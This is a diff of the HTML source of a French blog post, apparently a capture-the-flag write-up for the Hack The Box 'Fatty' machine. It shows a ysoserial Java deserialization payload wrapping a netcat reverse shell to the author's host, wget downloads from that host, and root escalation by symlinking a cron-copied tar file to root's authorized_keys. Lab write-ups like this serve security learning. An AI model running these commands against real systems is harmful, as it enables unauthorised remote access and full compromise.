-<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">MessageBuildException</span><span class="o">|</span><span class="n">htb</span><span class="o">.</span><span class="na">fatty</span><span class="o">.</span><span class="na">shared</span><span class="o">.</span><span class="na">message</span><span class="o">.</span><span class="na">MessageParseException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
-    <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="n">controlPanel</span><span class="o">,</span> <span class="s">&#34;Failure during message building/parsing.&#34;</span><span class="o">,</span> <span class="s">&#34;Error&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
-<span class="o">}</span>
-<span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>
-    <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="n">controlPanel</span><span class="o">,</span> <span class="s">&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class="o">,</span> <span class="s">&#34;Error&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
-<span class="o">}</span>
-<span class="n">textPane</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;Payload launched&#34;</span><span class="o">);</span> <span class="o">/*</span> <span class="n">Pour</span> <span class="n">être</span> <span class="n">sûr</span> <span class="n">que</span> <span class="n">ça</span> <span class="n">appelle</span> <span class="n">la</span> <span class="n">fonction</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ClientGuiTest</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">invoker</span><span class="o">.</span><span class="na">changePW</span><span class="o">(</span><span class="s">&#34;qtc&#34;</span><span class="o">,</span><span class="s">&#34;pouetpouet&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">MessageBuildException</span><span class="o">|</span><span class="n">htb</span><span class="o">.</span><span class="na">fatty</span><span class="o">.</span><span class="na">shared</span><span class="o">.</span><span class="na">message</span><span class="o">.</span><span class="na">MessageParseException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="n">controlPanel</span><span class="o">,</span> <span class="s">&#34;Failure during message building/parsing.&#34;</span><span class="o">,</span> <span class="s">&#34;Error&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="n">controlPanel</span><span class="o">,</span> <span class="s">&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class="o">,</span> <span class="s">&#34;Error&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">textPane</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;Payload launched&#34;</span><span class="o">);</span> <span class="o">/*</span> <span class="n">Pour</span> <span class="n">être</span> <span class="n">sûr</span> <span class="n">que</span> <span class="n">ça</span> <span class="n">appelle</span> <span class="n">la</span> <span class="n">fonction</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Et maintenant, on modifie le code de <em>changePW()</em>. Dans un premier temps il nous faut une payload.</p>
 <p>Pour générer la payload, on va utiliser <a href="https://github.com/frohoff/ysoserial" target="_blank">ysoserial</a>, d&rsquo;après le fichier <em>META-INF/maven/fatty-server/fatty-server/pom.xml</em> le serveur utilise la version 3.1 de <em>commons-collections</em>. Il y a donc 5 payloads possibles via <em>ysoserial</em>, on les essayer une par une.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">java -jar ysoserial.jar CommonsCollectionsX <span class="s1">&#39;nc 10.10.14.58 51337 -e /bin/sh&#39;</span> <span class="p">|</span> base64 -w0
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar ysoserial.jar CommonsCollectionsX <span class="s1">&#39;nc 10.10.14.58 51337 -e /bin/sh&#39;</span> <span class="p">|</span> base64 -w0
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Ici, X est à remplacer par le numéro de payload. On obtient un base64 que l&rsquo;on va utiliser dans notre code. Pour cela il n&rsquo;y a qu&rsquo;à modifier la ligne</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">this</span><span class="o">.</span><span class="na">action</span><span class="o">.</span><span class="na">addArgument</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">serializedUser64</span><span class="o">));</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">this</span><span class="o">.</span><span class="na">action</span><span class="o">.</span><span class="na">addArgument</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">serializedUser64</span><span class="o">));</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>par</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="n">String</span> <span class="n">b64payload</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="cm">/* AJOUTER LA PAYLOAD OBTENUE */</span><span class="o">);</span>
-<span class="k">this</span><span class="o">.</span><span class="na">action</span><span class="o">.</span><span class="na">addArgument</span><span class="o">(</span><span class="n">b46payload</span><span class="o">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">b64payload</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="cm">/* AJOUTER LA PAYLOAD OBTENUE */</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">this</span><span class="o">.</span><span class="na">action</span><span class="o">.</span><span class="na">addArgument</span><span class="o">(</span><span class="n">b46payload</span><span class="o">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Comme d&rsquo;habitude on passe par les étapes compilations &amp; création du jar puis on ouvre un listener sur notre machine.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp <span class="m">51337</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">51337</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On lance le client, se connecte en admin, va dans <em>Change Password</em> puis sans même remplir le formulaire on clique sur <em>Change</em>.</p>
 <p>Et là, avec la payload <em>CommonsCollections5</em> on obtient un reverse shell sur la machine.</p>
@@ -541,15 +541,15 @@ zip -r ../modified-client.jar *
 <p>Le fichier <em>user.txt</em> n&rsquo;a pas les droits de lecture (sans doute pour obliger les joueurs à avoir un shell pour le lire), on lui donne et le lit.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">chmod +r user.txt
-cat user.txt
-	7fab2c31fc7173a86872db45ae922073
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +r user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">	7fab2c31fc7173a86872db45ae922073
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="devenir-root">Devenir root</h1>
 <a class="post-dummy-target" id="obtenir-un-meilleur-shell"></a><h2>Obtenir un meilleur shell</h2>
@@ -558,22 +558,22 @@ cat user.txt
 <p>On va donc le récupérer via un serveur HTTP fait en python sur ma machine.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /tmp
-wget 10.10.14.58:9000/python2.7 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#Le 2&gt;&amp;1 permet d&#39;avoir le retour du wget</span>
-wget 10.10.14.58:9000/python2.7.zip 2&gt;<span class="p">&amp;</span><span class="m">1</span>
-chmod +x python2.7
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp
+</span></span><span class="line"><span class="cl">wget 10.10.14.58:9000/python2.7 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#Le 2&gt;&amp;1 permet d&#39;avoir le retour du wget</span>
+</span></span><span class="line"><span class="cl">wget 10.10.14.58:9000/python2.7.zip 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">chmod +x python2.7
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Puis on effectue notre suite de commande habituelle pour avoir un beau shell intéractif</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -583,37 +583,37 @@ chmod +x python2.7
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/python2.7.zip ./python2.7 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
-	&lt;Ctrl+Z&gt;
-
-stty -a <span class="p">|</span> head -n1 <span class="c1">#Je lis les valeurs rows &amp; columns</span>
-stty raw -echo
-<span class="nb">fg</span> <span class="c1">#Il faut faire plusieures fois entrée</span>
-stty rows X columns Y <span class="c1">#Avec X et Y les valeurs lues plus haut</span>
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color	
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/python2.7.zip ./python2.7 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">	&lt;Ctrl+Z&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">stty -a <span class="p">|</span> head -n1 <span class="c1">#Je lis les valeurs rows &amp; columns</span>
+</span></span><span class="line"><span class="cl">stty raw -echo
+</span></span><span class="line"><span class="cl"><span class="nb">fg</span> <span class="c1">#Il faut faire plusieures fois entrée</span>
+</span></span><span class="line"><span class="cl">stty rows X columns Y <span class="c1">#Avec X et Y les valeurs lues plus haut</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color	
+</span></span></code></pre></td></tr></table>
 </div>
 </div><a class="post-dummy-target" id="trouver-le-point-dentrée"></a><h2>Trouver le point d&rsquo;entrée</h2>
 <p>Maintenant, il faut trouver comment accéder au root de la machine sachant que nous sommes dans un docker.</p>
 <p>J&rsquo;utilise donc <a href="https://github.com/DominicBreuker/pspy" target="_blank">pspy</a> pour voir ce qu&rsquo;il se passe (ici encore récupéré via wget). Et on voit chaque minute une commande est executée par notre utilisateur.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ash -c scp -f /opt/fatty/tar/logs.tar 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash -c scp -f /opt/fatty/tar/logs.tar 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>L&rsquo;option <strong>-f</strong> de scp est non-documentée. En réalité c&rsquo;est un serveur distant qui demande à notre docker de lui envoyer le fichier <em>/opt/fatty/tar/logs.tar</em>. A partir de là on peut établir une hypothèse sur ce qui est executé sur le serveur que l&rsquo;on veut atteindre.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">scp qtc@&lt;IP DOCKER&gt;:/opt/fatty/tar/logs.tar .
-tar -xvf logs.tar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">scp qtc@&lt;IP DOCKER&gt;:/opt/fatty/tar/logs.tar .
+</span></span><span class="line"><span class="cl">tar -xvf logs.tar
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On peut ensuite supposer que ces commandes seront executées en tant que root.</p>
 <p>Si ces hypothèses savèrent vraies, alors on peut facilement obtenir le shell root.</p>
@@ -625,22 +625,22 @@ tar -xvf logs.tar
 <p>Je créé un lien symbolique</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ln -s /tmp/fichier_test symlink
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -s /tmp/fichier_test symlink
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
 <p>Je le met dans une archive</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">tar -cvf archive.tar symlink
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar -cvf archive.tar symlink
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -650,35 +650,35 @@ tar -xvf logs.tar
 <p>Je décompresse le tar</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">tar -xvf archive.tar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar -xvf archive.tar
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
 <p>J&rsquo;écris dans le fichier symlink</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;Test test&#34;</span> &gt; symlink
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Test test&#34;</span> &gt; symlink
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
 <p>Le fichier <em>/tmp/fichier_test</em> existe et contient notre test</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">cat /etc/fichier_test
-  Test <span class="nb">test</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/fichier_test
+</span></span><span class="line"><span class="cl">	Test <span class="nb">test</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 </ul>
@@ -686,46 +686,46 @@ tar -xvf logs.tar
 <p>Donc on fait comme suit :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ln -s /root/.ssh/authorized_keys logs.tar
-tar -cvf archive.tar logs.tar
-cp archive.tar /opt/fatty/tar/logs.tar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -s /root/.ssh/authorized_keys logs.tar
+</span></span><span class="line"><span class="cl">tar -cvf archive.tar logs.tar
+</span></span><span class="line"><span class="cl">cp archive.tar /opt/fatty/tar/logs.tar
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On attend ensuite un scp (une minute, on peut voir son déclenchement avec <em>pspy</em>). Puis on remplace notre lien symbolique par un fichier contenant notre clef publique SSH</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;ssh-rsa AAAAB &lt;REDACTED&gt; vHXw== driikolu@Terweb&#34;</span> &gt; id_rsa.pub
-cp id_rsa.pub /opt/fatty/tar/logs.tar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ssh-rsa AAAAB &lt;REDACTED&gt; vHXw== driikolu@Terweb&#34;</span> &gt; id_rsa.pub
+</span></span><span class="line"><span class="cl">cp id_rsa.pub /opt/fatty/tar/logs.tar
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Là encore on attend le scp puis sur notre machine on fait</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ssh root@10.10.10.174
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@10.10.10.174
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Et nous avons un accès SSH direct en root. Il ne nous reste plus qu&rsquo;à lire le <em>root.txt</em>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">cat root.txt 
-	ee982fa19b413415391ed4a17b2bd9c7
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat root.txt 
+</span></span><span class="line"><span class="cl">	ee982fa19b413415391ed4a17b2bd9c7
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="conclusion">Conclusion</h1>
 <p>J&rsquo;ai trouvé cette box très intéréssante, c&rsquo;était ma première de niveau &ldquo;Insane&rdquo; et je pense que celui-ci n&rsquo;est pas volé. J&rsquo;ai appris quelques trucs en la faisant (notamment sur CommonsCollections) et ça m&rsquo;a permis de me remettre légèrement au Java.</p>
@@ -760,14 +760,15 @@ cp id_rsa.pub /opt/fatty/tar/logs.tar
         </section>
     </div>
 
-    <div class="post-nav"><a href="/2020/03/install_arch_chiffre_uefi/" class="prev" rel="prev" title="Installation d&#39;Archlinux en UEFI &amp; chiffré"><i class="fas fa-angle-left fa-fw"></i>Installation d&#39;Archlinux en UEFI &amp; chiffré</a></div>
+    <div class="post-nav"><a href="/2020/03/install_arch_chiffre_uefi/" class="prev" rel="prev" title="Installation d&#39;Archlinux en UEFI &amp; chiffré"><i class="fas fa-angle-left fa-fw"></i>Installation d&#39;Archlinux en UEFI &amp; chiffré</a>
+            <a href="/2022/04/word_worker_wu/" class="next" rel="next" title="BreizhCTF 2022 - Extranet Word Worker">BreizhCTF 2022 - Extranet Word Worker<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div><div class="post-comment"></div>
     </article></div>
             </main><footer class="footer">
     <div class="copyright"><div class="copyright-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
         </div>
 
-        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Driikolu</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Driikolu</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
     </div>
 </footer></div><a href="#" class="dynamic-to-top" id="dynamic-to-top" data-scroll>
             <span>&nbsp;</span>
